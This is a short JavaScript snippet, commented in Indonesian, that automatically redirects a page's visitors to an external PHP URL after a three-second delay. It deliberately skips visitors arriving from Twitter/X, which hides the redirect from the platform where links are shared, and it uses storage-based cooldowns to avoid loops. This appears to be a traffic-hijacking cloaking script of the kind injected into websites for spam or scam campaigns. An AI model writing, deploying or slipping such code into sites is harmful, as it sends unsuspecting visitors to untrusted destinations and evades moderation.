(function () {
  try {
    // === SETTING ===
    var target     = "https://vidoy.fun/cB6Tyq0.php"; // tujuan redirect
    var cooldownMs = 60 * 1000;   // jeda antar redirect (1 menit)
    var delayMs    = 3000;        // delay sebelum redirect (ms)
    // ===============

    if (!/^https:\/\//i.test(target)) return;

    var qs = location.search + location.hash;
    if (/[?#](?:.*[&?])?noredir=1/i.test(qs)) return;

    // deteksi Twitter/X
    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");
    var isX = /(t\.co|twitter\.com|x\.com)/i.test(REF) || /twitter/i.test(UA);

    // kalau dari Twitter, stop
    if (isX) return;

    // anti-loop
    var page = location.origin + location.pathname;
    var sessKey = "redir_seen:" + page;
    var cdKey   = "redir_cd:"   + page;

    var now = Date.now();
    if (sessionStorage.getItem(sessKey)) return;
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return;

    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));

    // redirect otomatis setelah delay
    setTimeout(function () {
      try { location.href = target; } catch(_) {}
    }, delayMs);

  } catch (_) {}
})();
